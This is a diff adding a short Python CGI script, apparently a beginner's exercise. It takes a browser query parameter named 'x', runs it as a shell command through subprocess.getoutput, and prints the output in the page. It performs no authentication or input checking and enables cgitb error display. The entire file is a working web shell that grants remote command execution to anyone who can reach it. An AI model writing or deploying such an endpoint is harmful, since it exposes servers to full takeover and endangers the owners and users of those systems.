@@ -1,0 +1,18 @@
+#!/usr/bin/python3
+import cgi                                
+import cgitb
+import subprocess                          
+# to show common error in browser          
+cgitb.enable()         
+                  
+print("Content-type:text/html")            
+print("")                             
+#this will collect all the html code with data  
+webdata=cgi.FieldStorage() 
+#now extracting value of x  
+data=webdata.getvalue('x')
+#sending output to server 
+output=subprocess.getoutput(data)    
+print("<pre>") 
+print(output) 
+print("</pre>")     
